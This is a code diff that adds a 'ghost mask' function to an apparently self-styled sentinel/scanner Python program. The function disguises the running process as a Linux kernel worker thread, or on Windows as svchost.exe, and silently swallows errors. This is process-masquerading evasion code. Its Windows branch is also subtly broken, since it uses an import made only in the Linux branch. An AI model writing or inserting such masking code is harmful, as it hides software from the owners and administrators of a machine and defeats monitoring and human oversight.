@@ -75,6 +75,31 @@ def activate_global_scanner(dna):
 
 speaker = wincl.Dispatch("SAPI.SpVoice")
 
+def apply_ghost_mask():
+    """Architect Level: Disguises the process within the OS kernel list."""
+    target_name = "[kworker/u16:2-events_power_efficient]"
+    
+    if sys.platform != "win32":
+        try:
+            # Method 1: Set Process Title
+            import setproctitle
+            setproctitle.setproctitle(target_name)
+        except ImportError:
+            # Method 2: Prctl (Native Linux)
+            try:
+                import ctypes
+                libc = ctypes.CDLL('libc.so.6')
+                buff = ctypes.create_string_buffer(len(target_name) + 1)
+                buff.value = target_name.encode()
+                libc.prctl(15, ctypes.byref(buff), 0, 0, 0) # PR_SET_NAME
+            except:
+                pass
+        print(f"[!] GHOST: Identity masked as {target_name}")
+    else:
+        # Windows Masking: svchost mimicry
+        if setproctitle:
+            setproctitle.setproctitle("svchost.exe -k netsvcs -p")
+
 def run_sentinel():
     with open("dna/genome.json", "r") as f:
         dna = json.load(f)
